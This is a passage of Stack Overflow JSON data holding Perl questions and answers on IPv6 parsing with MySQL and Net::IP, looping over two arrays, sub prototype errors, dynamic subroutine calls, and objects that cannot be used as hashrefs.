returns: &quot;for checking pattern matching with a PATT ON THe back!&quot;</p>\n<p>How can I fix this problem?</p>\n"}, {"tags": ["mysql", "perl", "ipv6"], "comments": [{"owner": {"reputation": 8333, "user_id": 813192, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dee82a22b9a73f459fe180128811e4c1?s=128&d=identicon&r=PG", "display_name": "Sander Steffann", "link": "https://stackoverflow.com/users/813192/sander-steffann"}, "edited": false, "score": 0, "creation_date": 1454949671, "post_id": 35272860, "comment_id": 58260935, "body": "Try again with real IPv6 addresses first"}], "answers": [{"comments": [{"owner": {"reputation": 4989, "user_id": 3745413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jQsNL.png?s=128&g=1", "display_name": "Ron Maupin", "link": "https://stackoverflow.com/users/3745413/ron-maupin"}, "edited": false, "score": 0, "creation_date": 1454953122, "post_id": 35275519, "comment_id": 58263239, "body": "Actually, <code>fff:fff:fff:fff:fff:fff:fe0::</code> is a reserved address which should not be used for anything, possibly why it returns undefined. My guess is that this is a mangled link local address for something like <code>fe80:0:ffff:ffff:ffff:ffff:ffff:ffff</code>, which would be a valid link-local address."}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "reply_to_user": {"reputation": 4989, "user_id": 3745413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jQsNL.png?s=128&g=1", "display_name": "Ron Maupin", "link": "https://stackoverflow.com/users/3745413/ron-maupin"}, "edited": false, "score": 0, "creation_date": 1454953397, "post_id": 35275519, "comment_id": 58263395, "body": "@RonMaupin, this happens also for <code>2001:0db8:85a3:0000:0000:8a2e:0370::</code>, and I have checked that the point it&#39;s rejected by <code>Net::IP</code> is when it finds there are 8 <code>:</code>s. Also, it is perfectly happy with the exact same IP address with a trailing <code>:0</code> instead of <code>::</code>."}, {"owner": {"reputation": 4989, "user_id": 3745413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jQsNL.png?s=128&g=1", "display_name": "Ron Maupin", "link": "https://stackoverflow.com/users/3745413/ron-maupin"}, "edited": false, "score": 0, "creation_date": 1454953936, "post_id": 35275519, "comment_id": 58263700, "body": "The rules are that you do not replace a single word with <code>::</code>. RFC 5952 clarifies that in <code>2001:0db8:85a3:0000:0000:8a2e:0370::</code>, you must compress it as <code>2001:db8:85a3::8a2e:370:0</code>. Leading zeros are to be removed within words, and the longest string of zero words must be compressed (leftmost if there are two equal length sets of zero words), but not a single zero word."}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "reply_to_user": {"reputation": 4989, "user_id": 3745413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jQsNL.png?s=128&g=1", "display_name": "Ron Maupin", "link": "https://stackoverflow.com/users/3745413/ron-maupin"}, "edited": false, "score": 0, "creation_date": 1454954003, "post_id": 35275519, "comment_id": 58263740, "body": "Then the bug is in MySQL, not <code>Net::IP</code>. Let me change the answer."}, {"owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "reply_to_user": {"reputation": 4989, "user_id": 3745413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jQsNL.png?s=128&g=1", "display_name": "Ron Maupin", "link": "https://stackoverflow.com/users/3745413/ron-maupin"}, "edited": false, "score": 1, "creation_date": 1454954652, "post_id": 35275519, "comment_id": 58264065, "body": "Well, reading RFC 5952 in detail, it states that such representations should not be output (so MySQL is at fault), but also that they should be accepted as input if compliant with RFC 4191 (so <code>Net::IP</code> is at fault)!"}, {"owner": {"reputation": 4989, "user_id": 3745413, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jQsNL.png?s=128&g=1", "display_name": "Ron Maupin", "link": "https://stackoverflow.com/users/3745413/ron-maupin"}, "edited": false, "score": 0, "creation_date": 1454954863, "post_id": 35275519, "comment_id": 58264181, "body": "I wrote my IPv6 routines so that just about any IPv6 representation is accepted, including IPv4 mixed, it is then converted to a 128-bit binary representation internally for manipulation, and anything output is in the RFC 5952 canonical format."}], "tags": [], "owner": {"reputation": 15906, "user_id": 3527940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/k1R45.jpg?s=128&g=1", "display_name": "jcaron", "link": "https://stackoverflow.com/users/3527940/jcaron"}, "is_accepted": true, "score": 2, "last_activity_date": 1454956247, "last_edit_date": 1592644375, "creation_date": 1454952002, "answer_id": 35275519, "question_id": 35272860, "link": "https://stackoverflow.com/questions/35272860/ipv6-sql-to-perl/35275519#35275519", "title": "IPv6 SQL to Perl", "body": "<p>Apparently MySQL and <code>Net::IP</code> do not agree on the use of <code>::</code> to represent a trailing <code>:0</code>.</p>\n<p>As far as I understand <a href=\"https://tools.ietf.org/html/rfc4291#section-2.2\" rel=\"nofollow noreferrer\">RFC4191</a>, <code>fff:fff:fff:fff:fff:fff:fe0::</code> should be a perfectly valid IPv6 address (expanded as <code>0fff:0fff:0fff:0fff:0fff:0fff:0fe0:0000</code>), but <code>Net::IP</code> does not seem to agree.</p>\n<p><code>Net::IP</code> seems to agree on using <code>::</code> for a trailing <code>:0:0</code>, but not for just <code>:0</code>. It is also OK with <code>::</code> replacing a single <code>:0:</code> anywhere else. Looks like a bug. It can be traced down to <code>ip_is_ipv6</code> which thinks that an IPv6 address cannot have 8 <code>:</code>s (which is true in all cases but a single leading or trailing 0 replaced by <code>::</code>).</p>\n<p>You could do a bit of preprocessing to replace a trailing <code>::</code> with <code>:0</code> and a leading <code>::</code> with <code>0:</code> if there are 8 colons in the IP.</p>\n<h3>EDIT</h3>\n<p>It turns out that <a href=\"https://tools.ietf.org/html/rfc5952#section-4.2.2\" rel=\"nofollow noreferrer\">RFC5952</a> says that single <code>0</code> (and hence a trailing <code>:0</code>) should not be replaced by <code>::</code> in output, so the MySQL <code>INET6_NTOA</code> is at fault, but it still says that RFC4191-compliant addresses should be accepted as input, so <code>Net::IP</code> should accept it nonetheless. Fixing the bug on either side would address the issue.</p>\n"}], "owner": {"reputation": 737, "user_id": 734062, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/5579b17e7d2228c75a45d0f6365ba983?s=128&d=identicon&r=PG", "display_name": "psgels", "link": "https://stackoverflow.com/users/734062/psgels"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 124, "favorite_count": 0, "accepted_answer_id": 35275519, "answer_count": 1, "score": 1, "last_activity_date": 1454956247, "creation_date": 1454944245, "question_id": 35272860, "link": "https://stackoverflow.com/questions/35272860/ipv6-sql-to-perl", "title": "IPv6 SQL to Perl", "body": "<p>I have a field in a mysql table as a varbinary(16), which stores binary IPv6 addresses. </p>\n\n<p>While toying around with my code and testing stuff, I filled one of its records with the binary value for:</p>\n\n<pre><code>0fff0fff0fff0fff0fff0fff0fe00000\n</code></pre>\n\n<p>(this is the value I see in phpmyadmin)</p>\n\n<p>When I call up the value with the query:</p>\n\n<pre><code>SELECT INET6_NTOA(value)\nFROM table\n</code></pre>\n\n<p>The return value I get is </p>\n\n<pre><code>fff:fff:fff:fff:fff:fff:fe0::\n</code></pre>\n\n<p>In perl, when I try to put this into a Net::IP-object:</p>\n\n<pre><code>$ip = new Net::IP('fff:fff:fff:fff:fff:fff:fe0::', 6);\n</code></pre>\n\n<p>It returns undefined.</p>\n\n<p>My questions:</p>\n\n<ul>\n<li>Who or what is wrong here?</li>\n<li>Why?</li>\n<li>What can I do to make perl understand the IP address I'm giving to it?</li>\n</ul>\n"}, {"tags": ["perl", "loops", "foreach"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5896469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d39f770d048923faf3feeabb5d2236e?s=128&d=identicon&r=PG&f=1", "display_name": "LyChn", "link": "https://stackoverflow.com/users/5896469/lychn"}, "edited": false, "score": 0, "creation_date": 1454946597, "post_id": 35272108, "comment_id": 58258961, "body": "Thank you very much! the longer solution worked. I just removed the s from items and the code worked perfectly."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454946979, "post_id": 35272108, "comment_id": 58259231, "body": "Rather, you should add the <code>s</code> to the existing variable. It ends up being less confusing if you use plural for your collections."}, {"owner": {"reputation": 1, "user_id": 5896469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d39f770d048923faf3feeabb5d2236e?s=128&d=identicon&r=PG&f=1", "display_name": "LyChn", "link": "https://stackoverflow.com/users/5896469/lychn"}, "edited": false, "score": 0, "creation_date": 1454948145, "post_id": 35272108, "comment_id": 58259959, "body": "Thank you for the advice! I&#39;ll change that"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 6, "last_activity_date": 1454946125, "last_edit_date": 1454946125, "creation_date": 1454941953, "answer_id": 35272108, "question_id": 35272016, "link": "https://stackoverflow.com/questions/35272016/how-to-integrate-a-loop-in-another-loop-in-perl/35272108#35272108", "title": "How to integrate a loop in another loop in Perl", "body": "<p>You want <code>$varis[$i]</code> where <code>$i</code> is the index of the element of <code>@items</code> being processed, but you don't have <code>$i</code>. As such, you need to iterate over the indexes of <code>@items</code> instead of iterating over its elements.</p>\n\n<p>Solution:</p>\n\n<pre><code>my $sum = 0;\nfor my $i (0..$#items) { \n   my $item;\n   if ($items[$i] == 0) {\n      $item = 0;\n   } else {\n      $item = $varis[$i];\n   }\n\n   $sum = $sum + $item;\n}\n</code></pre>\n\n<p>Simplified solution:</p>\n\n<pre><code>my $sum = 0;\nfor my $i (0..$#items) {\n    $sum += $varis[$i] if $items[$i];\n}\n</code></pre>\n\n\n"}], "owner": {"reputation": 1, "user_id": 5896469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d39f770d048923faf3feeabb5d2236e?s=128&d=identicon&r=PG&f=1", "display_name": "LyChn", "link": "https://stackoverflow.com/users/5896469/lychn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 35272108, "answer_count": 1, "score": -1, "last_activity_date": 1454946125, "creation_date": 1454941678, "question_id": 35272016, "link": "https://stackoverflow.com/questions/35272016/how-to-integrate-a-loop-in-another-loop-in-perl", "title": "How to integrate a loop in another loop in Perl", "body": "<p>For the code below I am trying to include another loop into the foreach statement.\nI have two lists. \nThe first one \"item\" is my list where I check the elements if they are zero or not.\nThe second list \"varis\" is my list where the values are saved for the case the values are not zero.</p>\n\n<p>I want to check if the values in my list \"item\" are zero, if so set the elements as zero.\nIf not set the value of the first element as the first value listed in my list varis.\nSame goes for the second element. If the second element is not zero set the value as the second value listed in varis and so on.\nSo far I used the foreach statement to check my elements of my \"item\" list.\nHowever I'm not sure how to go about my second list.\nI am thinking about integrating a second loop into my foreach statement.\nBut I don't know how.</p>\n\n<pre><code>$sums = (2+4+5+6+5+10+4); \nmy @item=(0,50,5,3,5,15,0);\n$sum = 0;\nmy @varis = (2,4,5,6,5,10,4);\n\nforeach my $item(@item){\n        if ( $item==0) {$item=0}    # if element in item is zero set element as zero\n           else {$item=$varis;}     # else for element in @item set the value as the first element in @varis, for the second element (if it's not zero) in @item add the second element and so on     \n       $sum = $sum + $item;         # sum all the values\n    }\n\n    $result = $sums/$sum;\n    print \"$result\\n\";\n</code></pre>\n"}, {"tags": ["perl", "perl-module"], "comments": [{"owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454941108, "post_id": 35271681, "comment_id": 58255054, "body": "They are the subroutines inside SortFeedSeq and SeqComparator package respectively."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454941687, "post_id": 35271681, "comment_id": 58255494, "body": "Not the problem you&#39;re asking about, but shouldn&#39;t <code>\\%AIT_hash,\\%SE_hash,\\%SBC_hash</code> be <code>$AIT_hash_ref,$SE_hash_ref,$SBC_hash_ref</code>? Always use <code>use strict; use warnings qw( all );</code>!"}, {"owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454941711, "post_id": 35271681, "comment_id": 58255511, "body": "Hi I am a beginner in perl. What exactly a prototype mean. How to find it out?"}, {"owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454941924, "post_id": 35271681, "comment_id": 58255669, "body": "&#39;sub sortfeedseq($$$$$$){ my $feed_type=$_[0]; \tmy $FeedInputFile=$_[1]; \tmy $SortedTrailerFile=$_[2]; \tmy $AIT_hash_ref=$_[3]; \tmy $SE_hash_ref=$_[4]; \tmy $SBC_hash_ref=$_[5]; my code......}&#39;"}, {"owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454942062, "post_id": 35271681, "comment_id": 58255759, "body": "sub comparator($$$$$$$) {my $feed_type=$_[0];     my $InputSortedFile=$_[1]; \tmy $Seqerrfile=$_[2]; \twarn info_H. &quot;Seqerrfile is:$Seqerrfile \\n&quot;;  \tmy $Gaperrfile=$_[3]; \twarn info_H. &quot;Gaperrfile is:$Seqerrfile \\n&quot;; \tmy $AIT_hash_ref=$_[4]; \tmy $SE_hash_ref=$_[5]; \tmy $SBC_hash_ref=$_[6]; }"}, {"owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454942099, "post_id": 35271681, "comment_id": 58255784, "body": "This is how I am reading the arguments in subroutines."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454942166, "post_id": 35271681, "comment_id": 58255837, "body": "1) That&#39;s not readable. Pieces of your question should be in your Question. 2) The code in your question combined with those definitions do not result in the error messages you got."}, {"owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454942207, "post_id": 35271681, "comment_id": 58255863, "body": "it&#39;s saying the error in in line num 92 and 93. in line 92 and 93 I am not calling these subroutines. line 92 and 93 is below code  my %SBC_hash=%$SBC_hash_ref; my $extractfooter = ExtractSort::extractfooter(&quot;$feedDir/$_&quot;,$fileout);"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1454941602, "creation_date": 1454941602, "answer_id": 35271985, "question_id": 35271681, "link": "https://stackoverflow.com/questions/35271681/not-enough-arguements-for-perl-module-compilation-error/35271985#35271985", "title": "Not enough arguements for perl module-Compilation error", "body": "<p><code>sortfeedseq</code> and <code>comparator</code> each have a prototype. A sub's prototype dictates the syntax of calls to it, and you are violating the syntax imposed by the prototypes of these subs. Specifically, you aren't passing the correct number of arguments to the subs.</p>\n\n<p>As we aren't familiar with the subs in question, we can't tell you what the expect for arguments. You'll have to consult the documentation for these modules, or study the subs themselves.</p>\n"}], "owner": {"reputation": 23, "user_id": 5599403, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/209a7e5ee419c7ad0f47c334eff37811?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5599403/nithin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1454941602, "creation_date": 1454940656, "last_edit_date": 1454940910, "question_id": 35271681, "link": "https://stackoverflow.com/questions/35271681/not-enough-arguements-for-perl-module-compilation-error", "title": "Not enough arguements for perl module-Compilation error", "body": "<p>Hi I have a Perl script named <code>feed_validator.pl</code>. From this, I am calling a Perl module named <code>fetch_sequence_vals.pm</code> as follows:</p>\n\n<pre><code>my ($AIT_hash_ref,$SE_hash_ref,$SBC_hash_ref,$db_pack_val_tpb)=fetch_sequneceVals::seqVals();\n</code></pre>\n\n<p><code>fetch_sequence_vals.pm</code> returns the reference of three hashes as shown below.</p>\n\n<pre><code>return(\\%AIT_hash,\\%SE_hash,\\%SBC_hash,$db_pack_val_tpb);\n</code></pre>\n\n<p>Now, I am passing these three hashes as input for two Perl modules named <code>SortFeedSeq</code> and <code>SeqComparator</code>, as shown below.</p>\n\n<pre><code>my $sortfeedtrailer = SortFeedSeq::sortfeedseq(\n    $region,$sortfileout,$SortedTrailerFile,\\%AIT_hash,\\%SE_hash,\\%SBC_hash);   \nmy $compareseq= SeqComparator::comparator(\n    $region,$SortedTrailerFile,$seq_err,$gap_err,\\%AIT_hash,\\%SE_hash,\\%SBC_hash);\n</code></pre>\n\n<p>When I run <code>feed_validator.pl</code>, it's throwing a compilation error saying </p>\n\n<pre><code>Not enough arguments for SortFeedSeq::sortfeedseq\n</code></pre>\n\n<p>and</p>\n\n<pre><code>Not enough arguments for SeqComparator::comparator\n</code></pre>\n\n<p>I am stuck in this from few days. Kindly someone help me in solving the error. Thanks in advance.</p>\n"}, {"tags": ["perl", "function", "subroutine"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 2, "creation_date": 1454939864, "post_id": 35271340, "comment_id": 58254211, "body": "Why are you trying to do this? It&#39;s probably a bad idea."}, {"owner": {"reputation": 353, "user_id": 3930179, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8accad02d8b7e05b7b0f769d79a71999?s=128&d=identicon&r=PG&f=1", "display_name": "chaya", "link": "https://stackoverflow.com/users/3930179/chaya"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454940074, "post_id": 35271340, "comment_id": 58254345, "body": "Actually I have create dynamic  subroutine name for example : &quot;CreateLTemp_Table&quot;  in this place of &#39;L&#39;  it can come &#39;P&#39; also ,so it becomes  &quot;CreatePTemp_Table&quot;.."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 7, "last_activity_date": 1454940420, "last_edit_date": 1454940420, "creation_date": 1454940022, "answer_id": 35271480, "question_id": 35271340, "link": "https://stackoverflow.com/questions/35271340/how-to-create-a-dynamic-subroutine-name-in-perl/35271480#35271480", "title": "How to create a dynamic subroutine name in perl", "body": "<pre><code>&amp;{ $pkg_name.\"::\".$sub_name }(@args)\n</code></pre>\n\n<p>or</p>\n\n<pre><code>( $pkg_name.\"::\".$sub_name )-&gt;(@args)\n</code></pre>\n\n<p>These will fail, however, because you asked Perl to forbid you from doing this by placing <code>use strict;</code> in your program. You can disable <code>use strict;</code> locally</p>\n\n<pre><code>my $ref = do { no strict 'refs'; \\&amp;{ $pkg_name.\"::\".$sub_name } };\n$ref-&gt;(@args)\n</code></pre>\n\n<p>But it turns out that <code>\\&amp;$sub_name</code> is already exempt from strictures.</p>\n\n<pre><code>my $ref = \\&amp;{ $pkg_name.\"::\".$sub_name };\n$ref-&gt;(@args)\n</code></pre>\n\n<hr>\n\n<p>If instead of sub call, you needed a method call, you can use</p>\n\n<pre><code>my $ref = $o-&gt;can($method_name);\n$o-&gt;$ref(@args)\n</code></pre>\n\n<p>or just</p>\n\n<pre><code>$o-&gt;$method_name(@args)\n</code></pre>\n"}], "owner": {"reputation": 353, "user_id": 3930179, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/8accad02d8b7e05b7b0f769d79a71999?s=128&d=identicon&r=PG&f=1", "display_name": "chaya", "link": "https://stackoverflow.com/users/3930179/chaya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 698, "favorite_count": 1, "accepted_answer_id": 35271480, "answer_count": 1, "score": 2, "last_activity_date": 1454958262, "creation_date": 1454939622, "last_edit_date": 1454958262, "question_id": 35271340, "link": "https://stackoverflow.com/questions/35271340/how-to-create-a-dynamic-subroutine-name-in-perl", "title": "How to create a dynamic subroutine name in perl", "body": "<p>I want to create a dynamic subroutine name in perl, Here is trial code , I am getting error \"Bad name after feed_load::\"</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nBEGIN {\n      push @INC, '/freespace/attlas/data/bin/genericLoader /FeedLoaderLib/'\n}\n\nuse feed_load;\nmy type =\"L\";\nmy $tempTablefunct  = \"Create\".$type.\"Temp_Table\";\n\nfeed_load::&amp;$tempTablefunct-&gt;($tablename); ### pass a dynamic sub name HERE ###\n</code></pre>\n"}, {"tags": ["perl", "oop", "hashref"], "answers": [{"comments": [{"owner": {"reputation": 213, "user_id": 332332, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/ae91d8c26ec40927e017e5148511bdfc?s=128&d=identicon&r=PG", "display_name": "Kyle", "link": "https://stackoverflow.com/users/332332/kyle"}, "edited": false, "score": 0, "creation_date": 1454951903, "post_id": 35270410, "comment_id": 58262474, "body": "Thanks! With this idea, I was able to not only protect the objects from mis-use, but was able to accomplish the hashref emulation I awas looking to do!"}, {"owner": {"reputation": 213, "user_id": 332332, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/ae91d8c26ec40927e017e5148511bdfc?s=128&d=identicon&r=PG", "display_name": "Kyle", "link": "https://stackoverflow.com/users/332332/kyle"}, "edited": false, "score": 0, "creation_date": 1454951917, "post_id": 35270410, "comment_id": 58262481, "body": "Link to the patch for those who are interested: <a href=\"https://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=15759\" rel=\"nofollow noreferrer\">bugs.koha-community.org/bugzilla3/show_bug.cgi?id=15759</a>"}, {"owner": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1454957675, "post_id": 35270410, "comment_id": 58265680, "body": "@ikegami - nice!  When you suggested a &quot;scalar-based or array-based object instead&quot; I thought there&#39;d be major rewriting required."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 5, "last_activity_date": 1454937989, "last_edit_date": 1454937989, "creation_date": 1454936782, "answer_id": 35270410, "question_id": 35270199, "link": "https://stackoverflow.com/questions/35270199/how-can-i-stop-or-allow-a-perl-object-to-be-used-as-a-hashref/35270410#35270410", "title": "How can I stop or allow a perl object to be used as a hashref?", "body": "<p>I suggest using a scalar-based or array-based object instead of a hash-based object. This is a cheap (efficient) solution since it simply causes the offender to run afoul of existing type checks.</p>\n\n<p>For example, the object produced by the following is simply a reference to the actual object. Just use <code>$$self</code> instead of <code>$self</code> in the methods.</p>\n\n<pre><code>$ perl -e'\n   sub new {\n      my $class = shift;\n      my $self = bless(\\{}, $class);\n      # $$self-&gt;{...} = ...;\n      return $self;\n   }\n   my $o = __PACKAGE__-&gt;new();\n   my $id = $o-&gt;{id};\n'\nNot a HASH reference at -e line 9.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5886, "user_id": 2019415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645958eb08719fa5119052d7d1d079ff?s=128&d=identicon&r=PG", "display_name": "G. Cito", "link": "https://stackoverflow.com/users/2019415/g-cito"}, "edited": false, "score": 0, "creation_date": 1454957225, "post_id": 35270486, "comment_id": 58265469, "body": ":-D  yay!  Sort of OT but good point to raise.    I predict Inside Out will be cool again one day.  Have you tried <a href=\"https://metacpan.org/pod/Class::Std\" rel=\"nofollow noreferrer\"><code>Dios</code></a>?"}], "tags": [], "owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "is_accepted": false, "score": 3, "last_activity_date": 1454936988, "creation_date": 1454936988, "answer_id": 35270486, "question_id": 35270199, "link": "https://stackoverflow.com/questions/35270199/how-can-i-stop-or-allow-a-perl-object-to-be-used-as-a-hashref/35270486#35270486", "title": "How can I stop or allow a perl object to be used as a hashref?", "body": "<p>One way to do this, is by using \"inside-out objects\", where the object is just a blessed simple scalar, and the data is stored separately.\nSee, for instance, <a href=\"https://metacpan.org/pod/Class::Std\" rel=\"nofollow\">Class::STD</a></p>\n"}], "owner": {"reputation": 213, "user_id": 332332, "user_type": "registered", "accept_rate": 38, "profile_image": 